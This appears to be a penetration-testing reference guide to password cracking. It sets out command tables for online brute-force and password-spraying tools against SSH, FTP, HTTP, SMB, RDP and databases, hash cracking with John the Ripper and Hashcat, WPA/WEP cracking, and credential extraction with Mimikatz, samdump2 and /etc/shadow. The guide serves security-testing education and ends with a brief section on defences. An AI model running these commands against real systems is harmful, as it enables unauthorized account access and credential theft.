# Password Cracking Reference Guide

## Introduction

Password cracking is a critical technique in penetration testing used to gain unauthorized access to systems, services, and encrypted data. This comprehensive guide covers various password attack methodologies, tools, and techniques used during security assessments.

Password attacks can be categorized into several types including brute force, dictionary attacks, hybrid attacks, and rule-based attacks. Understanding these techniques is essential for both offensive security testing and defensive security posture assessment.

## Password Attack Types

### Attack Methodology Overview

| Attack Type | Description | Speed | Success Rate |
|-------------|-------------|-------|--------------|
| `Dictionary` | Uses predefined wordlists | Fast | Medium |
| `Brute Force` | Tries all possible combinations | Very Slow | High (given time) |
| `Hybrid` | Dictionary + rules/mutations | Medium | High |
| `Rule-based` | Applies transformation rules | Medium | High |
| `Mask` | Uses patterns/templates | Variable | Medium-High |
| `Rainbow Tables` | Precomputed hash lookups | Very Fast | Medium |

### Common Password Patterns

| Pattern Type | Examples | Description |
|--------------|----------|-------------|
| `Default Passwords` | admin/admin, root/toor | Vendor defaults |
| `Weak Passwords` | 123456, password, qwerty | Common weak choices |
| `Seasonal` | Winter2023!, Summer2024 | Date-based patterns |
| `Company-based` | CompanyName123! | Organization-related |
| `Keyboard Walks` | qwertyuiop, 1qaz2wsx | Keyboard patterns |

## Hydra - Network Login Cracker

### Basic Hydra Usage

| Command | Description |
|---------|-------------|
| `hydra -l username -p password target service` | Single username/password test |
| `hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://target` | Dictionary attack on SSH |
| `hydra -L users.txt -P passwords.txt target service` | Multiple users and passwords |
| `hydra -L users.txt -p password target service` | Password spraying |
| `hydra -l username -P wordlist.txt target service` | Single user, multiple passwords |

### SSH Password Attacks

| Command | Description |
|---------|-------------|
| `hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.100` | SSH root brute force |
| `hydra -L users.txt -P passwords.txt ssh://10.10.10.100` | SSH credential stuffing |
| `hydra -l admin -P passwords.txt -s 2222 ssh://10.10.10.100` | SSH on custom port |
| `hydra -l user -P wordlist.txt -t 4 ssh://10.10.10.100` | Limited threads (stealth) |
| `hydra -l user -P wordlist.txt -f ssh://10.10.10.100` | Stop after first success |

### FTP Password Attacks

| Command | Description |
|---------|-------------|
| `hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.100` | FTP brute force |
| `hydra -L users.txt -P passwords.txt ftp://10.10.10.100` | FTP credential testing |
| `hydra -l anonymous -p "" ftp://10.10.10.100` | Test anonymous FTP |
| `hydra -l ftp -P wordlist.txt -s 2121 ftp://10.10.10.100` | Custom FTP port |

### HTTP Authentication Attacks

| Command | Description |
|---------|-------------|
| `hydra -l admin -P passwords.txt 10.10.10.100 http-get /admin` | HTTP Basic Auth |
| `hydra -l admin -P passwords.txt 10.10.10.100 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"` | HTTP POST form |
| `hydra -L users.txt -P passwords.txt 10.10.10.100 https-get /secure` | HTTPS Basic Auth |
| `hydra -l admin -P wordlist.txt 10.10.10.100 http-get-form "/login.php:user=^USER^&pass=^PASS^:failed"` | HTTP GET form |

### SMB/NetBIOS Attacks

| Command | Description |
|---------|-------------|
| `hydra -l administrator -P passwords.txt smb://10.10.10.100` | SMB password attack |
| `hydra -L users.txt -P passwords.txt smb://10.10.10.100` | SMB credential spraying |
| `hydra -l guest -p "" smb://10.10.10.100` | Test guest account |

### RDP Password Attacks

| Command | Description |
|---------|-------------|
| `hydra -l administrator -P passwords.txt rdp://10.10.10.100` | RDP brute force |
| `hydra -L users.txt -p Password123! rdp://10.10.10.100` | RDP password spraying |
| `hydra -l user -P wordlist.txt -t 1 rdp://10.10.10.100` | Slow RDP attack |

### Database Attacks

| Command | Description |
|---------|-------------|
| `hydra -l root -P passwords.txt mysql://10.10.10.100` | MySQL brute force |
| `hydra -l sa -P passwords.txt mssql://10.10.10.100` | MSSQL brute force |
| `hydra -l postgres -P passwords.txt postgres://10.10.10.100` | PostgreSQL attack |
| `hydra -l oracle -P passwords.txt oracle-listener://10.10.10.100` | Oracle attack |

## John the Ripper - Hash Cracking

### Basic John Usage

| Command | Description |
|---------|-------------|
| `john hashes.txt` | Crack hashes with default settings |
| `john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt` | Dictionary attack |
| `john --rules hashes.txt` | Apply word mangling rules |
| `john --incremental hashes.txt` | Brute force mode |
| `john --show hashes.txt` | Show cracked passwords |

### Hash Format Detection

| Command | Description |
|---------|-------------|
| `john --list=formats` | List supported hash formats |
| `john --format=NT hashes.txt` | Specify NTLM hash format |
| `john --format=md5crypt shadow.txt` | Crack /etc/shadow hashes |
| `john --format=raw-sha256 hashes.txt` | Crack SHA256 hashes |

### Advanced John Techniques

| Command | Description |
|---------|-------------|
| `john --wordlist=wordlist.txt --rules=best64 hashes.txt` | Use best64 rules |
| `john --mask=?u?l?l?l?l?d?d?d hashes.txt` | Mask attack (Uppercase+4lowercase+3digits) |
| `john --markov hashes.txt` | Markov chain attack |
| `john --external=policy hashes.txt` | Custom external mode |

### John Session Management

| Command | Description |
|---------|-------------|
| `john --session=mysession hashes.txt` | Named session |
| `john --restore=mysession` | Restore interrupted session |
| `john --status=mysession` | Check session status |

## Hashcat - Advanced Hash Cracking

### Basic Hashcat Usage

| Command | Description |
|---------|-------------|
| `hashcat -m 0 hashes.txt wordlist.txt` | MD5 dictionary attack |
| `hashcat -m 1000 hashes.txt wordlist.txt` | NTLM dictionary attack |
| `hashcat -m 1800 hashes.txt wordlist.txt` | SHA-512 dictionary attack |
| `hashcat -a 3 -m 0 hashes.txt ?d?d?d?d?d?d` | Brute force 6 digits |

### Hash Mode Reference

| Hash Type | Mode | Example Command |
|-----------|------|-----------------|
| `MD5` | 0 | `hashcat -m 0 hash.txt wordlist.txt` |
| `SHA1` | 100 | `hashcat -m 100 hash.txt wordlist.txt` |
| `SHA256` | 1400 | `hashcat -m 1400 hash.txt wordlist.txt` |
| `NTLM` | 1000 | `hashcat -m 1000 hash.txt wordlist.txt` |
| `bcrypt` | 3200 | `hashcat -m 3200 hash.txt wordlist.txt` |
| `WPA/WPA2` | 2500 | `hashcat -m 2500 capture.hccapx wordlist.txt` |

### Attack Modes

| Mode | Description | Example |
|------|-------------|---------|
| `0` | Dictionary | `hashcat -a 0 -m 1000 hash.txt wordlist.txt` |
| `1` | Combinator | `hashcat -a 1 -m 1000 hash.txt word1.txt word2.txt` |
| `3` | Brute Force | `hashcat -a 3 -m 1000 hash.txt ?a?a?a?a?a` |
| `6` | Hybrid Dict+Mask | `hashcat -a 6 -m 1000 hash.txt wordlist.txt ?d?d` |
| `7` | Hybrid Mask+Dict | `hashcat -a 7 -m 1000 hash.txt ?d?d wordlist.txt` |

### Hashcat Mask Attacks

| Mask | Description | Example |
|------|-------------|---------|
| `?l` | Lowercase letters | `hashcat -a 3 -m 0 hash.txt ?l?l?l?l` |
| `?u` | Uppercase letters | `hashcat -a 3 -m 0 hash.txt ?u?l?l?l` |
| `?d` | Digits | `hashcat -a 3 -m 0 hash.txt ?d?d?d?d` |
| `?s` | Special characters | `hashcat -a 3 -m 0 hash.txt ?l?l?s?d` |
| `?a` | All characters | `hashcat -a 3 -m 0 hash.txt ?a?a?a?a` |

### Rule-based Attacks

| Command | Description |
|---------|-------------|
| `hashcat -m 1000 hash.txt wordlist.txt -r rules/best64.rule` | Apply best64 rules |
| `hashcat -m 1000 hash.txt wordlist.txt -r rules/d3ad0ne.rule` | Apply d3ad0ne rules |
| `hashcat -m 1000 hash.txt wordlist.txt -r rules/dive.rule` | Apply dive rules |

## Other Password Cracking Tools

### Medusa - Network Authentication Cracker

| Command | Description |
|---------|-------------|
| `medusa -h 10.10.10.100 -u admin -P passwords.txt -M ssh` | SSH brute force |
| `medusa -h 10.10.10.100 -U users.txt -P passwords.txt -M ftp` | FTP credential testing |
| `medusa -h 10.10.10.100 -u admin -p password -M http -m DIR:/admin` | HTTP directory auth |

### Ncrack - Network Authentication Cracker

| Command | Description |
|---------|-------------|
| `ncrack -vv --user admin -P passwords.txt ssh://10.10.10.100` | SSH password attack |
| `ncrack -p 3389 -user administrator -P passwords.txt 10.10.10.100` | RDP brute force |
| `ncrack -p 21 --user ftp -P passwords.txt 10.10.10.100` | FTP password attack |

### Patator - Multi-protocol Brute Forcer

| Command | Description |
|---------|-------------|
| `patator ssh_login host=10.10.10.100 user=root password=FILE0 0=passwords.txt` | SSH brute force |
| `patator ftp_login host=10.10.10.100 user=admin password=FILE0 0=wordlist.txt` | FTP attack |
| `patator http_fuzz url=http://10.10.10.100/login method=POST body='user=admin&pass=FILE0' 0=passwords.txt` | HTTP POST attack |

## Wireless Password Cracking

### WPA/WPA2 Cracking

| Command | Description |
|---------|-------------|
| `aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap` | WPA dictionary attack |
| `hashcat -m 2500 capture.hccapx wordlist.txt` | WPA/WPA2 with Hashcat |
| `john --wordlist=wordlist.txt --format=wpapsk capture.john` | WPA with John |

### WEP Cracking

| Command | Description |
|---------|-------------|
| `aircrack-ng capture.cap` | WEP key recovery |
| `aircrack-ng -n 64 capture.cap` | 64-bit WEP key |
| `aircrack-ng -n 128 capture.cap` | 128-bit WEP key |

## Password Lists and Wordlists

### Common Wordlist Locations

| Wordlist | Location | Description |
|----------|----------|-------------|
| `RockYou` | `/usr/share/wordlists/rockyou.txt` | Most popular password list |
| `SecLists` | `/usr/share/seclists/Passwords/` | Various password collections |
| `Probable Wordlists` | `/usr/share/wordlists/` | Probability-ordered lists |
| `CIRT` | `/usr/share/wordlists/` | Default password lists |

### Custom Wordlist Generation

| Tool | Command | Description |
|------|---------|-------------|
| `crunch` | `crunch 8 8 -t @@@@@@%% > wordlist.txt` | Generate pattern-based wordlist |
| `cewl` | `cewl -d 2 -m 5 http://target.com > wordlist.txt` | Website-based wordlist |
| `cupp` | `python cupp.py -i` | Interactive personal wordlist |
| `mentalist` | `mentalist` | GUI wordlist generator |

### Wordlist Manipulation

| Command | Description |
|---------|-------------|
| `sort wordlist.txt \| uniq > clean_wordlist.txt` | Remove duplicates |
| `cat list1.txt list2.txt > combined.txt` | Combine wordlists |
| `head -n 1000 wordlist.txt > top1000.txt` | Get top 1000 entries |
| `grep -E "^.{8,12}$" wordlist.txt > 8to12chars.txt` | Filter by length |

## Hash Extraction and Preparation

### Windows Hash Extraction

| Method | Command | Description |
|--------|---------|-------------|
| `SAM Database` | `samdump2 SYSTEM SAM > hashes.txt` | Extract from SAM |
| `Mimikatz` | `privilege::debug` then `sekurlsa::logonpasswords` | Memory extraction |
| `PWDump` | `pwdump7.exe > hashes.txt` | Live system extraction |

### Linux Hash Extraction

| File | Command | Description |
|------|---------|-------------|
| `/etc/passwd` | `cat /etc/passwd` | User account information |
| `/etc/shadow` | `sudo cat /etc/shadow` | Password hashes (root required) |
| `Combined` | `unshadow passwd shadow > combined.txt` | Prepare for John |

### Hash Format Conversion

| Tool | Command | Description |
|------|---------|-------------|
| `hash-identifier` | `hash-identifier` | Identify hash type |
| `hashid` | `hashid hash.txt` | Hash type identification |
| `john` | `john --list=formats \| grep -i md5` | List supported formats |

## Performance Optimization

### Hardware Optimization

| Technique | Description |
|-----------|-------------|
| `GPU Acceleration` | Use CUDA/OpenCL with Hashcat |
| `Multiple GPUs` | Distribute workload across GPUs |
| `RAM Optimization` | Use sufficient RAM for wordlists |
| `SSD Storage` | Fast storage for wordlist access |

### Attack Optimization

| Strategy | Description |
|----------|-------------|
| `Start with common passwords` | Try top 1000 passwords first |
| `Use probability wordlists` | Ordered by likelihood |
| `Hybrid attacks` | Combine dictionary with rules |
| `Distributed cracking` | Use multiple systems |

## Defensive Measures

### Password Policy Recommendations

| Policy | Recommendation |
|--------|----------------|
| `Minimum Length` | 12+ characters |
| `Complexity` | Mix of uppercase, lowercase, digits, symbols |
| `Dictionary Check` | Reject common passwords |
| `Expiration` | Regular password changes |
| `Account Lockout` | Limit failed attempts |

### Detection and Monitoring

| Indicator | Description |
|-----------|-------------|
| `Multiple failed logins` | Possible brute force attack |
| `Unusual login times` | Off-hours authentication attempts |
| `Geographic anomalies` | Logins from unusual locations |
| `Service enumeration` | Scanning for authentication services |

This comprehensive password cracking guide provides essential techniques and tools for security testing and assessment during penetration testing engagements.
